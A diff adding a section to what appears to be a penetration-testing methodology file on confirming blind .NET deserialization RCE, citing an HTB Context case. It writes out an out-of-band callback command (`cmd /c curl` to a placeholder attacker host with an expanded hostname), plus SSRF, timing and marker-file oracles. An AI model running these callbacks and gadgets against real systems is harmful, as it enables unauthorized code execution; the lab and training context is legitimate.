@@ -165,6 +165,21 @@
 - Bugcrowd — multiple deserialization disclosures
 - Self-hosted — Spring / Tomcat / WebLogic targets
 
+## Proving a BLIND deser RCE actually fired (don't assume "blocked")
+
+Blind sinks usually wrap the deserialize in `try/catch{}`, so the HTTP response is **identical** whether the gadget runs or not. A null/unchanged response is NOT evidence of failure — you must use an out-of-band oracle. Order of escalation:
+
+1. **Command-exec callback with a server-side expansion** — the single best proof. Run `cmd /c curl http://<vpn>:<port>/PWN-%COMPUTERNAME%`. If the callback path contains the *expanded* hostname (e.g. `/PWN-WEB`), command execution is proven, not just a network primitive. Run a verbose catcher first; log src IP + User-Agent (curl vs PowerShell reveals the exec path).
+2. **In-process SSRF** (`WebClient.DownloadString(url)` gadget) — if this fires but `Process.Start` doesn't, the block is process-exec policy (WDAC/AppLocker), not the serializer.
+3. **Timing oracle** — gadget runs `ping -n 9 127.0.0.1` (~8s) vs a fast control; compare latency.
+4. **Marker write** — write a file to a web-served dir and GET it back.
+
+If 1–4 all stay silent, *then* question the serializer/gadget — but first confirm inbound works via a **separate** known-good callback primitive, so you don't misattribute a tooling/encoding bug to a "hardened target."
+
+## Watch for a gate before the sink
+
+The sink may be guarded (`if (Session.Keys.Count != 0)`, a feature flag, an auth check). Test authed-vs-unauthed **differentially**: fire the identical gadget with and without a populated session; a callback only in the authed case confirms both the gate condition and the RCE. Don't conclude "deser dead" when the real state is "gate unmet" — find what populates the gate (login flow, a Session-writing endpoint). (Real case: HTB Context — the JavaScriptSerializer/SimpleTypeResolver `Profile` cookie sink is gated on a populated session; firing the ObjectDataProvider gadget *after* an authenticated login produced an immediate `%COMPUTERNAME%`-expanded callback, after 6 sessions of wrongly concluding it was architecturally blocked.)
+
 ## Cheat-sheet companions in this repo
 
 - `scenarios/deserialization/php-deserialization.md`
